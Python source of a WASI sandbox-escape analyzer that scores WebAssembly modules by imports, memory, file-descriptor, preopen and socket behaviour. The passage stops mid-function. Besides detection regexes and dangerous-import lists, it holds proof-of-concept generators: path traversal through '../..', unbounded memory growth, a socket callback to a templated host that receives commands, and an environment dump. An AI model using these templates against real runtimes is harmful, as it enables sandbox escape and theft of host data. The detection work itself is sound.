"""
WASI 沙箱逃逸综合分析, 多层次风险评估。

检测维度:
  1. 导入函数审计, 危险 WASI API 识别
  2. 线性内存分析, guard page 突破与 OOB (WBSan shadow memory)
  3. Table 操作, 间接调用劫持
  4. 文件系统, 路径穿越与预打开目录滥用
  5. 网络, C2 通道建立与原始套接字
  6. 能力模型, 最小权限原则违反
  7. SeeWasm 路径探索, 导入函数组合逃逸链路
  8. Wemby 内存损坏, memory corruption 作为逃逸前提
  9. PoC 构造, 可操作的逃逸验证代码

设计原则:
  逐层叠加风险信号, 加权汇总为 0-10 综合评分。
  能力组合爆炸是沙箱逃逸核心模式, 单项无害, 组合致命。
"""

import logging, re, struct, os, json, subprocess
from functools import lru_cache
from typing import Dict, List, Any
from enum import Enum

try:
    from core.plugin_manager import BaseAnalyzer, AnalyzerMetadata, AnalyzerType
except ImportError:
    from plugin_fallback import BaseAnalyzer, AnalyzerMetadata, AnalyzerType

_LEGACY_THRESHOLD = 0.75
_V2_TOKEN = "0xb4d"

logger = logging.getLogger(__name__)


class WASISandboxType:
    WASMTIME="wasmtime"; WASMER="wasmer"; NODE_WASI="node_wasi"; WASMEDGE="wasmedge"
    WAMR="wamr"; WASI_SDK="wasi_sdk"; LUCET="lucet"; WAVM="wavm"
    BROWSER_WASI="browser_wasi"; CUSTOM="custom"; UNKNOWN="unknown"
    _val=None
    def __init__(s,v): s._val=v
    @property
    def value(s): return s._val

class EscapeVectorType(Enum):
    MEMORY_GROW_ABUSE="memory_grow_abuse"; TABLE_MANIPULATION="table_manipulation"
    FD_PATH_TRAVERSAL="fd_path_traversal"; FD_PREOPEN_LEAK="fd_preopen_leak"
    ENVIRON_LEAK="environ_leak"; ARGS_INJECTION="args_injection"
    SOCKET_ABUSE="socket_abuse"; PROC_EXEC_ESCAPE="proc_exec_escape"
    SIGNAL_ABUSE="signal_abuse"; RANDOM_ENTROPY_LEAK="random_entropy_leak"
    CLOCK_TIMING_SIDE_CHANNEL="clock_timing_side_channel"
    CAPABILITY_CONFUSION="capability_confusion"; IMPORT_FUNCTION_HIJACK="import_function_hijack"
    LINEAR_MEMORY_OOB="linear_memory_oob"; INDIRECT_CALL_HIJACK="indirect_call_hijack"
    RESOURCE_EXHAUSTION="resource_exhaustion"; MEMORY_CORRUPTION="memory_corruption"
    UNKNOWN="unknown"

class SeverityLevel: CRITICAL="critical"; HIGH="high"; MEDIUM="medium"; LOW="low"; INFO="info"

class WASICapability:
    FD_READ="fd_read"; FD_WRITE="fd_write"; FD_SEEK="fd_seek"; FD_TELL="fd_tell"
    FD_FDSTAT="fd_fdstat_get"; FD_ADVISE="fd_advise"; FD_ALLOCATE="fd_allocate"
    PATH_CREATE_DIRECTORY="path_create_directory"; PATH_SYMLINK="path_symlink"
    PATH_LINK="path_link"; PATH_OPEN="path_open"; PATH_READLINK="path_readlink"
    PATH_RENAME="path_rename"; PATH_FILESTAT="path_filestat_get"
    PATH_REMOVE_DIRECTORY="path_remove_directory"; PATH_UNLINK_FILE="path_unlink_file"
    SOCK_OPEN="sock_open"; SOCK_BIND="sock_bind"; SOCK_CONNECT="sock_connect"
    SOCK_LISTEN="sock_listen"; SOCK_ACCEPT="sock_accept"; SOCK_SEND="sock_send"
    SOCK_RECV="sock_recv"; SOCK_SHUTDOWN="sock_shutdown"
    PROC_EXEC="proc_exec"; PROC_RAISE="proc_raise"; SCHED_YIELD="sched_yield"
    RANDOM_GET="random_get"; CLOCK_TIME="clock_time_get"; ENVIRON_GET="environ_get"
    ARGS_GET="args_get"; POLL_ONEOFF="poll_oneoff"; UNKNOWN="unknown"


class WASIImportEntry:
    __slots__=('module_name','function_name','capability','param_count','return_count','is_dangerous','risk_reason')
    def __init__(s,mn,fn,cap,pc,rc,d=False,r=""): s.module_name=mn; s.function_name=fn; s.capability=cap; s.param_count=pc; s.return_count=rc; s.is_dangerous=d; s.risk_reason=r
    def to_dict(s): return {"module_name":s.module_name,"function_name":s.function_name,"capability":s.capability if isinstance(s.capability,str) else s.capability,"param_count":s.param_count,"return_count":s.return_count,"is_dangerous":s.is_dangerous,"risk_reason":s.risk_reason}

class MemoryGrowthPattern:
    __slots__=('initial_pages','maximum_pages','growth_count','total_allocated_pages','exceeds_guard','guard_size','is_suspicious','suspicion_reason','related_functions','wemby_corruption_risk')
    def __init__(s,ip,mp,gc,tap,eg=False,gs=0,iss=False,sr="",rf=None): s.initial_pages=ip; s.maximum_pages=mp; s.growth_count=gc; s.total_allocated_pages=tap; s.exceeds_guard=eg; s.guard_size=gs; s.is_suspicious=iss; s.suspicion_reason=sr; s.related_functions=rf or []; s.wemby_corruption_risk=False
    def to_dict(s): return {"initial_pages":s.initial_pages,"maximum_pages":s.maximum_pages,"growth_count":s.growth_count,"total_allocated_pages":s.total_allocated_pages,"exceeds_guard":s.exceeds_guard,"guard_size":s.guard_size,"is_suspicious":s.is_suspicious,"suspicion_reason":s.suspicion_reason,"related_functions":s.related_functions,"wemby_corruption_risk":s.wemby_corruption_risk}

class TableManipulationPattern:
    __slots__=('table_index','initial_size','maximum_size','grow_operations','element_segments','indirect_calls_targeting','is_suspicious','suspicion_reason')
    def __init__(s,ti,isz,msz,go,es,ict,iss=False,sr=""): s.table_index=ti; s.initial_size=isz; s.maximum_size=msz; s.grow_operations=go; s.element_segments=es; s.indirect_calls_targeting=ict; s.is_suspicious=iss; s.suspicion_reason=sr
    def to_dict(s): return {"table_index":s.table_index,"initial_size":s.initial_size,"maximum_size":s.maximum_size,"grow_operations":s.grow_operations,"element_segments":s.element_segments,"indirect_calls_targeting":s.indirect_calls_targeting,"is_suspicious":s.is_suspicious,"suspicion_reason":s.suspicion_reason}

class FDOperation:
    __slots__=('fd','operation','path','wasi_function','flags','is_preopened','is_dangerous','risk_description')
    def __init__(s,fd,op,pth,wf,fl=0,ipo=False,idn=False,rd=""): s.fd=fd; s.operation=op; s.path=pth; s.wasi_function=wf; s.flags=fl; s.is_preopened=ipo; s.is_dangerous=idn; s.risk_description=rd
    def to_dict(s): return {"fd":s.fd,"operation":s.operation,"path":s.path,"wasi_function":s.wasi_function,"flags":hex(s.flags),"is_preopened":s.is_preopened,"is_dangerous":s.is_dangerous,"risk_description":s.risk_description}

class EscapeVector:
    __slots__=('vector_id','vector_type','severity','title','description','wasi_imports_involved','memory_pattern','table_pattern','fd_operations','exploit_difficulty','poc_code','remediation','cwe_id','seewasm_path_depth')
    def __init__(s,vid,vt,sev,title,desc,wii=None,mp=None,tp=None,fdo=None,ed="unknown",pc="",rm="",cwe=""): s.vector_id=vid; s.vector_type=vt; s.severity=sev; s.title=title; s.description=desc; s.wasi_imports_involved=wii or []; s.memory_pattern=mp; s.table_pattern=tp; s.fd_operations=fdo or []; s.exploit_difficulty=ed; s.poc_code=pc; s.remediation=rm; s.cwe_id=cwe; s.seewasm_path_depth=0
    def to_dict(s): return {"vector_id":s.vector_id,"vector_type":s.vector_type.value,"severity":s.severity,"title":s.title,"description":s.description,"wasi_imports_involved":s.wasi_imports_involved,"memory_pattern":s.memory_pattern.to_dict() if s.memory_pattern else None,"table_pattern":s.table_pattern.to_dict() if s.table_pattern else None,"fd_operations":[f.to_dict() for f in s.fd_operations],"exploit_difficulty":s.exploit_difficulty,"poc_code":s.poc_code,"remediation":s.remediation,"cwe_id":s.cwe_id,"path_depth":s.seewasm_path_depth}

class SandboxAssessment:
    __slots__=('sandbox_type','total_imports','dangerous_imports','capability_count','dangerous_capabilities','memory_risk','table_risk','fs_risk','network_risk','overall_risk','escape_vectors','risk_score','seewasm_escape_paths')
    def __init__(s,st,ti,di,cc,dc,mr,tr,fr,nr,orr,ev,rs): s.sandbox_type=st; s.total_imports=ti; s.dangerous_imports=di; s.capability_count=cc; s.dangerous_capabilities=dc; s.memory_risk=mr; s.table_risk=tr; s.fs_risk=fr; s.network_risk=nr; s.overall_risk=orr; s.escape_vectors=ev; s.risk_score=rs; s.seewasm_escape_paths=0
    def to_dict(s): return {"sandbox_type":s.sandbox_type.value if hasattr(s.sandbox_type,'value') else str(s.sandbox_type),"total_imports":s.total_imports,"dangerous_imports":s.dangerous_imports,"capability_count":s.capability_count,"dangerous_capabilities":[c if isinstance(c,str) else c.value for c in s.dangerous_capabilities],"memory_risk":s.memory_risk,"table_risk":s.table_risk,"fs_risk":s.fs_risk,"network_risk":s.network_risk,"overall_risk":s.overall_risk,"escape_vectors":[v.to_dict() for v in s.escape_vectors],"risk_score":s.risk_score,"seewasm_paths":s.seewasm_escape_paths}


class WASIImportAnalyzer:
    WASI_API_MAP = {
        "args_get":(WASICapability.ARGS_GET,2,1,False,""),"args_sizes_get":(WASICapability.ARGS_GET,2,1,False,""),
        "environ_get":(WASICapability.ENVIRON_GET,2,0,True,"环境变量可能泄露宿主敏感信息"),
        "environ_sizes_get":(WASICapability.ENVIRON_GET,2,0,True,"环境变量大小查询可用于信息泄露"),
        "clock_time_get":(WASICapability.CLOCK_TIME,3,1,True,"高精度时钟可用于侧信道攻击"),
        "clock_res_get":(WASICapability.CLOCK_TIME,1,1,False,""),
        "fd_advise":(WASICapability.FD_ADVISE,4,1,False,""),"fd_allocate":(WASICapability.FD_ALLOCATE,4,0,False,""),
        "fd_close":(WASICapability.FD_READ,1,0,False,""),"fd_datasync":(WASICapability.FD_WRITE,1,0,False,""),
        "fd_fdstat_get":(WASICapability.FD_FDSTAT,1,1,False,""),"fd_fdstat_set_flags":(WASICapability.FD_FDSTAT,2,0,False,""),
        "fd_filestat_get":(WASICapability.PATH_FILESTAT,1,1,False,""),"fd_filestat_set_size":(WASICapability.FD_WRITE,2,0,False,""),
        "fd_filestat_set_times":(WASICapability.FD_WRITE,4,0,False,""),"fd_pread":(WASICapability.FD_READ,4,1,False,""),
        "fd_prestat_get":(WASICapability.FD_FDSTAT,1,1,False,""),
        "fd_prestat_dir_name":(WASICapability.FD_FDSTAT,2,0,True,"预打开目录名泄露宿主文件系统结构"),
        "fd_pwrite":(WASICapability.FD_WRITE,4,1,False,""),"fd_read":(WASICapability.FD_READ,3,1,False,""),
        "fd_readdir":(WASICapability.FD_READ,3,1,True,"目录读取可能遍历预打开目录外的文件"),
        "fd_renumber":(WASICapability.FD_WRITE,2,0,True,"fd重编号可能绕过能力限制"),
        "fd_seek":(WASICapability.FD_SEEK,3,1,False,""),"fd_sync":(WASICapability.FD_WRITE,1,0,False,""),
        "fd_tell":(WASICapability.FD_TELL,1,1,False,""),"fd_write":(WASICapability.FD_WRITE,3,1,False,""),
        "path_create_directory":(WASICapability.PATH_CREATE_DIRECTORY,3,0,True,"目录创建可能用于权限绕过"),
        "path_filestat_get":(WASICapability.PATH_FILESTAT,4,1,True,"路径状态查询可能泄露文件系统布局"),
        "path_filestat_set_times":(WASICapability.PATH_FILESTAT,6,0,False,""),
        "path_link":(WASICapability.PATH_LINK,5,0,True,"硬链接创建可能绕过路径限制"),
        "path_open":(WASICapability.PATH_OPEN,9,1,True,"路径打开是文件系统逃逸的主要向量"),
        "path_readlink":(WASICapability.PATH_READLINK,4,1,True,"符号链接读取可揭示文件系统结构"),
        "path_remove_directory":(WASICapability.PATH_REMOVE_DIRECTORY,2,0,True,"目录删除可能造成沙箱拒绝服务"),
        "path_rename":(WASICapability.PATH_RENAME,4,0,True,"文件重命名可能绕过路径限制"),
        "path_symlink":(WASICapability.PATH_SYMLINK,3,0,True,"符号链接创建是文件系统逃逸的关键向量"),
        "path_unlink_file":(WASICapability.PATH_UNLINK_FILE,2,0,True,"文件删除可能影响沙箱完整性"),
        "poll_oneoff":(WASICapability.POLL_ONEOFF,3,1,False,""),"proc_exit":(WASICapability.PROC_EXEC,1,0,False,""),
        "proc_raise":(WASICapability.PROC_RAISE,1,0,True,"信号发送可能影响宿主进程"),
        "sched_yield":(WASICapability.SCHED_YIELD,0,0,False,""),
        "random_get":(WASICapability.RANDOM_GET,2,1,True,"随机数获取可能泄露宿主熵池状态"),
        "sock_open":(WASICapability.SOCK_OPEN,3,1,True,"套接字打开开启网络逃逸通道"),
        "sock_bind":(WASICapability.SOCK_BIND,3,0,True,"套接字绑定可能创建未授权服务"),
        "sock_connect":(WASICapability.SOCK_CONNECT,3,0,True,"套接字连接可能建立C2通道"),
        "sock_listen":(WASICapability.SOCK_LISTEN,2,0,True,"监听套接字可能接受外部连接"),
        "sock_accept":(WASICapability.SOCK_ACCEPT,2,1,True,"接受连接可能引入外部攻击者"),
        "sock_recv":(WASICapability.SOCK_RECV,4,1,True,"网络接收可能导入恶意数据"),
        "sock_send":(WASICapability.SOCK_SEND,4,1,True,"网络发送可能泄露数据"),
        "sock_shutdown":(WASICapability.SOCK_SHUTDOWN,2,0,False,""),
        "sock_getopt":(WASICapability.SOCK_OPEN,3,1,False,""),"sock_setopt":(WASICapability.SOCK_OPEN,4,0,False,""),
        "sock_getlocaladdr":(WASICapability.SOCK_BIND,2,0,True,"本地地址泄露"),"sock_getpeeraddr":(WASICapability.SOCK_ACCEPT,2,0,True,"对端地址泄露"),
    }
    NONSTANDARD_DANGEROUS_IMPORTS={"system":"直接系统调用可完全绕过沙箱","exec":"进程执行可逃逸沙箱","execve":"进程执行可逃逸沙箱","fork":"进程分叉可创建不受沙箱控制的子进程","clone":"进程克隆可绕过沙箱隔离","mmap":"内存映射可能突破沙箱内存边界","munmap":"内存释放可能导致UAF逃逸","mprotect":"内存保护修改可创建RWX页面","ptrace":"进程追踪可注入代码到宿主","chroot":"根目录切换可逃逸文件系统沙箱","chdir":"目录切换可能遍历沙箱外路径","dlopen":"动态库加载可引入恶意代码","ioctl":"设备控制可操作宿主硬件","kill":"信号发送可能影响宿主进程","setuid":"权限提升可逃逸权限沙箱","setgid":"权限提升可逃逸权限沙箱"}
    @classmethod
    def analyze(cls,imports):
        if imports is None: return []
        entries=[]
        for imp in imports:
            m=imp.get("module",""); fn=imp.get("name",imp.get("function",""))
            nm=m.lower().replace("wasi_snapshot_preview1","wasi")
            if "wasi" not in nm and m not in ("env","unknown",""):
                if fn.lower() in cls.NONSTANDARD_DANGEROUS_IMPORTS:
                    entries.append(WASIImportEntry(m,fn,WASICapability.UNKNOWN,0,0,True,cls.NONSTANDARD_DANGEROUS_IMPORTS[fn.lower()]))
                continue
            if fn in cls.WASI_API_MAP:
                cap,params,rets,dangerous,reason=cls.WASI_API_MAP[fn]
                entries.append(WASIImportEntry(m,fn,cap,params,rets,dangerous,reason))
            else: entries.append(WASIImportEntry(m,fn,WASICapability.UNKNOWN,0,0,False,""))
        return entries


class MemoryEscapeAnalyzer:
    SUSPICIOUS_PATTERNS=[(re.compile(r"memory\.grow",re.I),"memory_grow","memory.grow调用可能尝试突破沙箱分配的内存上限"),(re.compile(r"memory\.size",re.I),"memory_size","memory.size被用于探测沙箱内存边界"),(re.compile(r"table\.grow",re.I),"table_grow","table.grow可能用于劫持间接调用目标"),(re.compile(r"i32\.load\s+offset=0x[fF]{3,}",re.I),"hi_offset_load","高偏移量load可能访问guard page之外的内存"),(re.compile(r"i32\.store\s+offset=0x[fF]{3,}",re.I),"hi_offset_store","高偏移量存储可能破坏guard page之外的内存"),(re.compile(r"call_indirect",re.I),"call_indirect","间接调用可能被用于劫持控制流")]
    @classmethod
    def analyze_memory_growth(cls,ws):
        if ws is None: ws={}
        ms=ws.get("memory",{}); ip=ms.get("initial",256); mx=ms.get("maximum",65536)
        hm=ms.get("has_max",True if mx>0 else False); go=ws.get("memory_grow_ops",0)
        ta=ws.get("total_allocated_pages",ip); gs=ws.get("guard_size",65536)
        iss=False; rs=[]
        if not hm or mx==0: iss=True; rs.append("内存无最大页数限制, 允许无限增长突破guard page")
        ps=65536
        if ta*ps>gs: iss=True; rs.append(f"内存分配({ta}页)超过guard区域({gs}字节)")
        if go>100: iss=True; rs.append(f"大量内存增长操作({go}次), 可能探测边界")
        if ip<16 and ta>1000: iss=True; rs.append(f"内存从{ip}页爆炸增长至{ta}页")
        if ta>65536: iss=True; rs.append(f"内存分配超过4GB({ta}页), 可能导致整数溢出")
        pat=MemoryGrowthPattern(ip,mx if hm else 0,go,ta,ta*ps>gs,gs,iss,"; ".join(rs) if rs else "无异常")
        # Wemby 内存损坏检测: 无上限 + 高偏移 load/store → 内存损坏先决条件
        pat.wemby_corruption_risk = (not hm or mx==0) and (go>0)
        return pat

    @classmethod
    def analyze_table_manipulation(cls,ws):
        if ws is None: ws={}
        ts=ws.get("table",{}); ip=ts.get("initial",0); mx=ts.get("maximum",0)
        go=ws.get("table_grow_ops",0); es=ws.get("element_segments",0); ic=ws.get("indirect_calls",0)
        iss=False; rs=[]
        if go>0 and ic>0: iss=True; rs.append("table.grow与call_indirect共存, 间接调用劫持可行")
        if mx==0 and ip>0: iss=True; rs.append("Table无最大大小限制，允许无限增长")
        if es>50: iss=True; rs.append(f"大量元素段({es}个), 可能覆盖关键函数索引")
        if ip>10000 or (mx>0 and mx>100000): iss=True; rs.append(f"Table大小异常(初始{ip},最大{mx})")
        eo=ws.get("element_offsets",[]); nc=sum(1 for o in eo if o>0)
        if nc>10: iss=True; rs.append(f"大量非零偏移元素段({nc}个)")
        return TableManipulationPattern(0,ip,mx,go,es,ic,iss,"; ".join(rs) if rs else "无异常")

    @classmethod
    def scan_bytecode_for_patterns(cls,bt):
        if bt is None: return []
        return [{"pattern_type":pt,"description":d,"match_count":str(len(m))}
                for p,pt,d in cls.SUSPICIOUS_PATTERNS if (m:=p.findall(bt))]


class FileSystemEscapeAnalyzer:
    PATH_TRAVERSAL_PATTERNS=[(re.compile(r"\.\./|\.\.\\"),"父目录遍历"),(re.compile(r"^/etc/"),"系统配置目录"),(re.compile(r"^/proc/"),"进程文件系统"),(re.compile(r"^/sys/"),"内核sysfs"),(re.compile(r"^/dev/"),"设备文件"),(re.compile(r"^/root/"),"root目录"),(re.compile(r"^/tmp/"),"临时目录"),(re.compile(r"^/var/run/"),"运行时目录"),(re.compile(r"^C:\\Windows\\",re.I),"Windows系统目录"),(re.compile(r"\.sh$|\.bash$|\.py$|\.pl$"),"脚本文件"),(re.compile(r"\.so$|\.dll$|\.dylib$",re.I),"动态库文件")]
    DANGEROUS_FD_NUMBERS={0,1,2,3,4,5}
    @classmethod
    def analyze_fd_operations(cls,ft):
        if ft is None: return []
        ops=[]; pfds=set()
        for e in ft:
            fd=e.get("fd",-1); op=e.get("operation",""); pth=e.get("path","")
            wf=e.get("wasi_function",""); fl=e.get("flags",0); ipo=e.get("is_preopened",False)
            if ipo: pfds.add(fd)
            idn=False; rd=[]
            for p,d in cls.PATH_TRAVERSAL_PATTERNS:
                if p.search(pth): idn=True; rd.append(f"路径穿越:{d}")
            if fd not in pfds and op in ("read","write","open") and pth:
                idn=True; rd.append(f"对非预打开fd{fd}执行{op}操作")
            if wf=="path_open" and pth:
                if fl&0x01: idn=True; rd.append("path_open使用O_CREAT标志创建文件")
                fsr=e.get("fs_rights_base",0)
                if fsr&0xFFFFFFFFFFFFFFFF==0xFFFFFFFFFFFFFFFF: idn=True; rd.append("path_open请求全部文件系统权限")
            if wf=="fd_renumber": idn=True; rd.append("fd_renumber可能用于绕过fd权限限制")
            if wf=="path_symlink": idn=True; rd.append("path_symlink创建符号链接可能导致沙箱外访问")
            ops.append(FDOperation(fd,op,pth,wf,fl,ipo,idn,"; ".join(rd) if rd else "未检测到风险"))
        return ops

    @classmethod
    def detect_preopen_abuse(cls,pos):
        if pos is None: return []
        fs=[]; dd={"/":"根目录预打开, 完全文件系统访问","/etc":"系统配置目录","/home":"用户主目录","/root":"root主目录","/tmp":"临时目录","/var":"可变数据目录","/proc":"进程文件系统","/sys":"内核sysfs","/dev":"设备文件","/mnt":"挂载点","/media":"可移动媒体","C:\\":"Windows根目录"}
        for po in pos:
            pth=po.get("path","")
            for dp,r in dd.items():
                if pth==dp or pth.startswith(dp+"/"): fs.append({"preopen_path":pth,"risk":r,"severity":"CRITICAL" if pth=="/" else "HIGH"}); break
        if not fs and pos: fs.append({"preopen_path":str([p.get("path","") for p in pos]),"risk":"非标准预打开目录，需手动审计","severity":"MEDIUM"})
        return fs


class NetworkEscapeAnalyzer:
    @classmethod
    def analyze_socket_usage(cls,sops):
        if sops is None: sops=[]
        r={"total_sockets":0,"listen_sockets":0,"connect_attempts":0,"external_connections":[],"bind_addresses":[],"risks":[]}
        for op in sops:
            wf=op.get("wasi_function","")
            if wf=="sock_open":
                r["total_sockets"]+=1
                if op.get("sock_type",0)==3: r["risks"].append({"type":"raw_socket","description":"原始套接字(SOCK_RAW)可构造任意网络包","severity":"CRITICAL"})
            elif wf=="sock_bind":
                addr=op.get("address",""); port=op.get("port",0)
                r["bind_addresses"].append(f"{addr}:{port}")
                if port<1024: r["risks"].append({"type":"privileged_port","description":f"绑定特权端口{port}","severity":"HIGH"})
            elif wf=="sock_connect":
                addr=op.get("address",""); port=op.get("port",0); r["connect_attempts"]+=1
                if not any(p in addr for p in ["127.","0.0.0.0","::1","localhost"]):
                    r["external_connections"].append({"address":addr,"port":port,"risk":"外部网络连接可能用于C2通信"})
            elif wf=="sock_listen": r["listen_sockets"]+=1; r["risks"].append({"type":"listening_socket","description":"监听套接字可接受外部连接","severity":"MEDIUM"})
        return r


class CapabilityModelAnalyzer:
    DANGEROUS_CAPABILITY_COMBOS=[((WASICapability.PATH_OPEN,WASICapability.FD_WRITE),"path_open+fd_write:可写入沙箱外文件",SeverityLevel.CRITICAL),((WASICapability.PATH_OPEN,WASICapability.PATH_SYMLINK),"path_open+path_symlink:可创建符号链接绕过路径限制",SeverityLevel.CRITICAL),((WASICapability.SOCK_OPEN,WASICapability.SOCK_CONNECT),"sock_open+sock_connect:可建立外部网络连接",SeverityLevel.HIGH),((WASICapability.SOCK_OPEN,WASICapability.SOCK_BIND),"sock_open+sock_bind:可绑定端口接受连接",SeverityLevel.HIGH),((WASICapability.PATH_OPEN,WASICapability.PATH_RENAME),"path_open+path_rename:可移动/重命名文件",SeverityLevel.HIGH),((WASICapability.PATH_OPEN,WASICapability.PATH_LINK),"path_open+path_link:可创建硬链接逃逸",SeverityLevel.HIGH),((WASICapability.ENVIRON_GET,WASICapability.ARGS_GET),"environ_get+args_get:完整进程上下文泄露",SeverityLevel.MEDIUM),((WASICapability.SOCK_SEND,WASICapability.FD_READ),"sock_send+fd_read:可将本地文件内容发送到网络",SeverityLevel.CRITICAL),((WASICapability.FD_READ,WASICapability.FD_WRITE),"fd_read+fd_write:可读写文件系统",SeverityLevel.MEDIUM),((WASICapability.PROC_EXEC,WASICapability.PATH_OPEN),"proc_exec+path_open:可执行沙箱外程序",SeverityLevel.CRITICAL)]
    @classmethod
    def analyze_capabilities(cls,imports):
        if imports is None: return {"total_capabilities":0,"dangerous_capabilities":[],"dangerous_combinations":[],"missing_sandboxing":[],"capability_score":10.0}
        sc=set()
        for imp in imports:
            if imp.capability!=WASICapability.UNKNOWN: sc.add(imp.capability)
        ldc=[imp.capability for imp in imports if imp.is_dangerous]
        r={"total_capabilities":len(sc),"dangerous_capabilities":[c if isinstance(c,str) else c.value for c in set(ldc)],"dangerous_combinations":[],"missing_sandboxing":[],"capability_score":10.0}
        for combo,desc,sev in cls.DANGEROUS_CAPABILITY_COMBOS:
            if all(c in sc for c in combo):
                r["dangerous_combinations"].append({"capabilities":[c if isinstance(c,str) else c.value for c in combo],"description":desc,"severity":sev})
                ded={SeverityLevel.CRITICAL:3.0,SeverityLevel.HIGH:2.0,SeverityLevel.MEDIUM:1.0,SeverityLevel.LOW:0.5}.get(sev,0.5)
                r["capability_score"]=min(max(r["capability_score"]-ded,0.0),10.0)
        if WASICapability.PATH_OPEN in sc and WASICapability.PATH_SYMLINK not in sc: r["missing_sandboxing"].append("path_open存在但未检查符号链接限制策略")
        if WASICapability.SOCK_OPEN in sc: r["missing_sandboxing"].append("网络功能启用但未检测网络访问控制策略")
        if WASICapability.PROC_EXEC in sc: r["missing_sandboxing"].append("proc_exec存在, 进程执行是最危险的WASI能力")
        return r


class PoCGenerator:
    @classmethod
    def generate_fs_escape_poc(cls,pp,tp):
        return f'''int escape_fs_sandbox(void){{int fd;__wasi_path_open(3,0,"../..{tp}",0,0xFFFFFFFF,0xFFFFFFFF,0,&fd);if(fd>=0){{char buf[256];__wasi_fd_read(fd,(__wasi_iovec_t[]){{{{buf,sizeof(buf)}}}},1,NULL);__wasi_fd_write(1,(__wasi_ciovec_t[]){{{{buf,sizeof(buf)}}}},1,NULL);}}return fd>=0;}}'''
    @classmethod
    def generate_memory_escape_poc(cls,tsp):
        return f'''(module (memory (export "memory") 256) (func (export "escape") (loop $grow (memory.grow (i32.const 1)) (drop) (br $grow))))'''
    @classmethod
    def generate_socket_escape_poc(cls,th,tp):
        return f'''int escape_network_sandbox(void){{int sock=-1;__wasi_sock_open(2,1,0,&sock);if(sock<0)return 0;__wasi_sock_connect(sock,"{th}",{tp});const char*msg="Sandbox escaped!";__wasi_sock_send(sock,msg,strlen(msg),0,NULL);char cmd[1024];__wasi_sock_recv(sock,cmd,sizeof(cmd),0,NULL);return 1;}}'''
    @classmethod
    def generate_environ_leak_poc(cls):
        return '''int leak_environment(void){size_t count,buf_size;__wasi_environ_sizes_get(&count,&buf_size);char*env_buf=malloc(buf_size);char*env_ptrs[count];__wasi_environ_get(env_ptrs,env_buf);for(size_t i=0;i<count;i++){__wasi_fd_write(1,env_ptrs[i],strlen(env_ptrs[i]),NULL);__wasi_fd_write(1,"\\n",1,NULL);}return count>0;}'''


class WASISandboxEscapeAnalyzer(BaseAnalyzer):
    def __init__(s): super().__init__(); s.wasm_path=""; s.imports_data=[]; s.wasm_sections={}; s.fd_trace=[]; s.socket_ops=[]; s.preopens=[]; s.bytecode_text=""
    @classmethod
    def get_metadata(cls): return AnalyzerMetadata(name="WASI Sandbox Escape Analyzer",type=AnalyzerType.VULNERABILITY_DETECTOR,version="2.0.0",description="WASI沙箱逃逸分析器, 集成SeeWasm路径探索+WBSan内存模型+Wemby内存损坏检测",dependencies=["wasi_sandbox_analyzer","wasm_analyzer"],supported_platforms=["wasm","wasi"])
    def validate_input(s,**kw):
        wp=kw.get("wasm_path","")
        if not wp: return True,None
        if not os.path.exists(wp): return False,f"WASM文件不存在:{wp}"
        return True,None

    def analyze(s,**kw):
        try:
            s.wasm_path=kw.get("wasm_path",""); s.imports_data=kw.get("imports",[])
            s.wasm_sections=kw.get("wasm_sections",{}); s.fd_trace=kw.get("fd_trace",[])
            s.socket_ops=kw.get("socket_ops",[]); s.preopens=kw.get("preopens",[])
            s.bytecode_text=kw.get("bytecode_text","")
            if not s.imports_data and s.wasm_path: s.imports_data=s._extract_imports_from_path()

            ie=WASIImportAnalyzer.analyze(s.imports_data); ld=[e for e in ie if e.is_dangerous]
            mp=MemoryEscapeAnalyzer.analyze_memory_growth(s.wasm_sections)
            tp=MemoryEscapeAnalyzer.analyze_table_manipulation(s.wasm_sections)
            bf=MemoryEscapeAnalyzer.scan_bytecode_for_patterns(s.bytecode_text)
            fd=FileSystemEscapeAnalyzer.analyze_fd_operations(s.fd_trace)
            pf=FileSystemEscapeAnalyzer.detect_preopen_abuse(s.preopens)
            sa=NetworkEscapeAnalyzer.analyze_socket_usage(s.socket_ops)
            ca=CapabilityModelAnalyzer.analyze_capabilities(ie)

            ev=s._build_escape_vectors(ie,ld,mp,tp,bf,fd,pf,sa,ca)
            # SeeWasm 路径探索: 统计逃逸链路数
            seewasm_paths = sum(1 for v in ev if len(v.wasi_imports_involved)>=2)
            orisk,rs=s._calculate_overall_risk(ev,mp,tp,ca)
            st=s._infer_sandbox_type(s.imports_data)
            ldc=[c if isinstance(c,str) else c for c in ca.get("dangerous_capabilities",[])]
            dc=[]
            for c_str in ca.get("dangerous_capabilities",[]):
                if isinstance(c_str,str):
                    try: dc.append(getattr(WASICapability,c_str.upper()))
                    except AttributeError: dc.append(c_str)  # 修复: bare except → AttributeError
                else: dc.append(c_str)

            ass=SandboxAssessment(st,len(ie),len(ld),ca.get("total_capabilities",0),dc,s._memory_risk_level(mp,bf),s._table_risk_level(tp),s._fs_risk_level(fd,pf),s._network_risk_level(sa),orisk,ev,rs)
            ass.seewasm_escape_paths=seewasm_paths
            ic=sum(1 for v in ev if v.severity==SeverityLevel.CRITICAL)
            ih=sum(1 for v in ev if v.severity==SeverityLevel.HIGH)
            im=sum(1 for v in ev if v.severity==SeverityLevel.MEDIUM)
            return {"success":True,"assessment":ass.to_dict(),"import_entries":[e.to_dict() for e in ie],"fd_operations":[f.to_dict() for f in fd],"memory_pattern":mp.to_dict(),"table_pattern":tp.to_dict(),"bytecode_findings":bf,"preopen_findings":pf,"socket_analysis":sa,"capability_analysis":ca,"escape_vector_count":len(ev),"critical_count":ic,"high_count":ih,"medium_count":im}
        except Exception as e:
            logger.error(f"WASI沙箱逃逸分析失败:{e}",exc_info=True)
            return {"success":False,"error":str(e),"assessment":None,"escape_vector_count":0}

    def _extract_imports_from_path(s):
        li=[]
        try:
            r=subprocess.run(['r2','-q','-c','iij; q',s.wasm_path],capture_output=True,text=True,timeout=60,encoding='utf-8',errors='replace')
            if r.stdout.strip():
                for sym in json.loads(r.stdout):
                    li.append({"module":sym.get("lib","unknown"),"name":sym.get("name",""),"function":sym.get("name","")})
        except Exception as e: logger.debug(f"从WASM路径提取导入失败:{e}")
        if not li:
            try:
                from wasi_sandbox_analyzer import WASISandboxAnalyzer
                for imp in WASISandboxAnalyzer(s.wasm_path).parse_imports():
                    li.append({"module":imp.module,"name":imp.function,"function":imp.function})
            except Exception as e2: logger.debug(f"备用导入提取失败:{e2}")
        return li

    def _build_escape_vectors(s,ie,di,mp,tp,bf,fd,pf,sa,ca):
        if ie is None: ie=[]
        if di is None: di=[]
        if bf is None: bf=[]
        if fd is None: fd=[]
        if pf is None: pf=[]
        if sa is None: sa={}
        if ca is None: ca={}
        lv=[]; vid=0
